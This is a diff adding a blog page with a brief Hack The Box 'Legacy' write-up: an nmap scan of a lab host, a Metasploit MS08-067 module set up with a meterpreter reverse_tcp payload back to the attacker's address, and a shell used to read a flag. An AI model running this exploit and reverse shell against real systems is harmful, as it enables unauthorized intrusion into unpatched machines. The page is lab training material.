@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - HTB Legacy | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - HTB Legacy | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - HTB Legacy | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - HTB Legacy | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - HTB Legacy | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for HTB Legact">
+<meta itemprop="description" content="Writeup for HTB Legact" />
+<meta property="og:description" content="Writeup for HTB Legact" />
+<meta name="twitter:description" content="Writeup for HTB Legact" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-30T00:00:00Z />
+    <meta property="article:published_time" content=2023-10-30T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - HTB Legacy",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-30",
+        "description": "Writeup for HTB Legact",
+        "wordCount":  345 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-30",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/legacy/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - HTB Legacy</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-30T00:00:00&#43;00:00" itemprop="datePublished"> 30 Oct 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#legacy">Legacy</a></li>
+    <li><a href="#enumeration-with-nmap">Enumeration with Nmap</a></li>
+    <li><a href="#root-code">Root code</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="legacy">Legacy</h1>
+<h1 id="enumeration-with-nmap">Enumeration with Nmap</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">──<span class="o">(</span>parallels㉿kali<span class="o">)</span>-<span class="o">[</span>~/legacy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap 10.129.227.181 -sC -sV -T4 -oN nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-30 01:37 EET
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.227.181
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.054s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">135/tcp open  msrpc       Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp open  ��z��      Windows XP microsoft-ds
+</span></span><span class="line"><span class="cl">Service Info: OSs: Windows, Windows XP<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:96:b3:75 <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows XP <span class="o">(</span>Windows <span class="m">2000</span> LAN Manager<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_xp::-
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: legacy
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: LEGACY<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: HTB<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2023-11-04T03:35:28+02:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 5d00h57m37s, deviation: 1h24m51s, median: 4d23h57m37s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.56 seconds
+</span></span></code></pre></div><p>I searched Windows 2000 exploit and found the code MS08-067.</p>
+<p>I decided to search it on msfconsole.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; search MS08-067
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                 Disclosure Date  Rank   Check  Description</span>
+</span></span><span class="line"><span class="cl">   -  ----                                 ---------------  ----   -----  -----------
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/windows/smb/ms08_067_netapi
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   RHOSTS   10.129.227.181   yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/
+</span></span><span class="line"><span class="cl">                                       wiki/Using-Metasploit
+</span></span><span class="line"><span class="cl">   RPORT    <span class="m">445</span>              yes       The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   SMBPIPE  BROWSER          yes       The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   EXITFUNC  thread           yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LHOST     10.10.16.22      yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LPORT     <span class="m">4444</span>             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic Targeting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt;
+</span></span></code></pre></div><p>This seems working.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; cat user.txt
+</span></span><span class="line"><span class="cl">e69af0e4f443de7e36876fda4ec7644fmeterpreter &gt;
+</span></span></code></pre></div><p>I got shell.</p>
+<h1 id="root-code">Root code</h1>
+<p><img src="Legacy%20ce87b69e8b7248a1b16727dc87db83f2/Screenshot_2023-10-30_at_02.16.34.png" alt="Screenshot 2023-10-30 at 02.16.34.png"></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
